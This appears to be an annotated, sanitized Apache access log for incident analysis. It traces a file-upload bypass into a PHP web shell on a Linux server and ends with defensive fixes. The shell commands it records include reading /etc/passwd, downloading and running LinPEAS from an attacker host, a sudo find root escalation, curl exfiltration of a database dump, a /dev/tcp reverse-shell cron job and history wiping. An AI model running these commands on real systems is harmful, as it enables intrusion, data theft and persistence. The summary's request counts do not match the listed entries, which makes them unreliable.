@@ -1,0 +1,126 @@
+# Apache Access Log — Sanitized
+# Host: WEB-SERVER-01 (Ubuntu 22.04 / Apache 2.4.52)
+# Log path: /var/log/apache2/access.log
+# Window: 2024-05-21 14:20:00 UTC to 2024-05-21 15:00:00 UTC
+# Format: %h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
+# -----------------------------------------------------------------------
+# NOTE: Real IPs replaced with RFC 5737 documentation ranges.
+#       Sensitive paths preserved for analysis value.
+# -----------------------------------------------------------------------
+
+
+# === SECTION 1: ATTACKER RECONNAISSANCE (pre-upload) ===
+
+203.0.113.88 - - [21/May/2024:14:20:11 +0000] "GET / HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+203.0.113.88 - - [21/May/2024:14:20:14 +0000] "GET /about.php HTTP/1.1" 200 1823 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+203.0.113.88 - - [21/May/2024:14:20:19 +0000] "GET /contact.php HTTP/1.1" 200 2104 "/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+203.0.113.88 - - [21/May/2024:14:21:02 +0000] "GET /login.php HTTP/1.1" 200 4312 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+203.0.113.88 - - [21/May/2024:14:21:44 +0000] "POST /login.php HTTP/1.1" 302 0 "/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+# Note: Successful login — attacker authenticated as a valid user account
+203.0.113.88 - - [21/May/2024:14:22:01 +0000] "GET /dashboard.php HTTP/1.1" 200 6841 "/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+203.0.113.88 - - [21/May/2024:14:22:33 +0000] "GET /profile.php HTTP/1.1" 200 3902 "/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+# Note: Attacker browsing to profile page — discovered the file upload feature
+
+
+# === SECTION 2: UPLOAD VULNERABILITY EXPLOITATION ===
+
+# Legitimate upload for comparison baseline
+10.10.4.55 - - [21/May/2024:14:23:10 +0000] "POST /upload.php?action=profile_img HTTP/1.1" 200 312 "/profile.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+# ^^^ Normal: Content-Type: image/jpeg — filename: avatar.jpg — legitimate image
+
+# Attacker attempt 1 — raw .php extension (blocked by extension filter)
+203.0.113.88 - - [21/May/2024:14:25:17 +0000] "POST /upload.php?action=profile_img HTTP/1.1" 403 512 "/profile.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+# Note: Server blocked .php extension directly
+
+# Attacker attempt 2 — .php5 extension (blocked)
+203.0.113.88 - - [21/May/2024:14:25:49 +0000] "POST /upload.php?action=profile_img HTTP/1.1" 403 512 "/profile.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+# Note: .php5 also blocked
+
+# Attacker attempt 3 — MIME type spoofing SUCCESS ⚠️
+203.0.113.88 - - [21/May/2024:14:28:03 +0000] "POST /upload.php?action=profile_img HTTP/1.1" 200 289 "/profile.php" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+# BYPASS: Sent Content-Type: image/jpeg but file was actually thumb_resize.php
+# Server validated MIME header only — did not check magic bytes or extension
+# File saved to: /var/www/html/uploads/img_cache/thumb_resize.php
+
+
+# === SECTION 3: WEB SHELL EXECUTION ===
+
+203.0.113.88 - - [21/May/2024:14:32:07 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 9 "-" "curl/7.88.1"
+# cmd=whoami | Response: "www-data"
+# ⚠️ User-Agent changed from Firefox to curl — confirms scripted exploitation
+
+203.0.113.88 - - [21/May/2024:14:32:19 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 38 "-" "curl/7.88.1"
+# cmd=id | Response: "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+
+203.0.113.88 - - [21/May/2024:14:32:31 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 67 "-" "curl/7.88.1"
+# cmd=uname -a | Response: "Linux WEB-SERVER-01 5.15.0-91-generic #101-Ubuntu SMP..."
+
+203.0.113.88 - - [21/May/2024:14:33:02 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 412 "-" "curl/7.88.1"
+# cmd=ls /var/www/html | Response: directory listing
+
+203.0.113.88 - - [21/May/2024:14:34:11 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 2847 "-" "curl/7.88.1"
+# cmd=cat /etc/passwd | Response: full /etc/passwd contents
+# ⚠️ Sensitive file read
+
+203.0.113.88 - - [21/May/2024:14:35:47 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 1203 "-" "curl/7.88.1"
+# cmd=find / -perm -u=s -type f 2>/dev/null
+# ⚠️ SUID binary search — attacker hunting for privilege escalation paths
+
+203.0.113.88 - - [21/May/2024:14:38:02 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 43 "-" "curl/7.88.1"
+# cmd=wget http://203.0.113.88:9090/linpeas.sh -O /tmp/.cache/lp.sh
+# ⚠️ Outbound wget to attacker C2 — downloads LinPEAS
+
+203.0.113.88 - - [21/May/2024:14:38:19 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 18921 "-" "curl/7.88.1"
+# cmd=chmod +x /tmp/.cache/lp.sh && bash /tmp/.cache/lp.sh
+# ⚠️ LinPEAS executed — large 18KB response reveals sudo misconfiguration on 'find'
+
+203.0.113.88 - - [21/May/2024:14:43:07 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 24 "-" "curl/7.88.1"
+# cmd=sudo find . -exec /bin/bash \; -quit
+# ⚠️ PRIVILEGE ESCALATION via GTFOBins — response confirms "root"
+
+203.0.113.88 - - [21/May/2024:14:44:02 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 1122 "-" "curl/7.88.1"
+# cmd=cat /var/www/html/config.php
+# ⚠️ Database credentials exfiltrated from application config
+
+203.0.113.88 - - [21/May/2024:14:45:18 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 67 "-" "curl/7.88.1"
+# cmd=mysqldump -u webappuser -p[REDACTED] webapp_db > /tmp/.cache/db.sql
+# ⚠️ Full database dumped to disk
+
+203.0.113.88 - - [21/May/2024:14:46:03 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 31 "-" "curl/7.88.1"
+# cmd=curl -X POST -F "file=@/tmp/.cache/db.sql" http://203.0.113.88:9090/upload
+# ⚠️ EXFILTRATION — ~12MB database sent to attacker C2
+
+203.0.113.88 - - [21/May/2024:14:47:22 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 19 "-" "curl/7.88.1"
+# cmd=crontab -e (adds: * * * * * bash -i >& /dev/tcp/203.0.113.88/4444 0>&1)
+# ⚠️ PERSISTENCE — reverse shell cron job planted
+
+203.0.113.88 - - [21/May/2024:14:48:55 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 12 "-" "curl/7.88.1"
+# cmd=history -c && rm /root/.bash_history
+# ⚠️ Anti-forensics — bash history wiped
+
+203.0.113.88 - - [21/May/2024:14:51:44 +0000] "POST /uploads/img_cache/thumb_resize.php HTTP/1.1" 200 28 "-" "curl/7.88.1"
+# cmd=ls /tmp/.cache/ | Last web shell request before host isolation
+
+
+# === SECTION 4: TRAFFIC SUMMARY ===
+
+Metric                                   Value
+---------------------------------------  ----------------------------------
+Total requests from 203.0.113.88         19
+Requests to /upload.php                  3  (2 blocked 403, 1 bypass 200)
+Requests to /uploads/img_cache/*.php     16 (all web shell execution)
+HTTP 200 responses to web shell          14
+HTTP 403 blocked uploads                 2
+User-Agent (recon phase)                 Firefox/115.0 (browser)
+User-Agent (exploitation phase)          curl/7.88.1 (scripted)
+Attack start                             2024-05-21 14:20:11 UTC
+Last web shell request                   2024-05-21 14:51:44 UTC
+
+# -----------------------------------------------------------------------
+# ANALYST NOTES:
+# - UA switch from Firefox to curl at 14:32:07 marks start of exploitation
+# - Response sizes expose command output volume (18KB = full LinPEAS output)
+# - Two failed upload attempts before bypass = attacker probed filters
+# - MIME spoofing fix: validate file extension AND read magic bytes (file header)
+# - Web root /uploads/ directory should block PHP execution via .htaccess
+# -----------------------------------------------------------------------
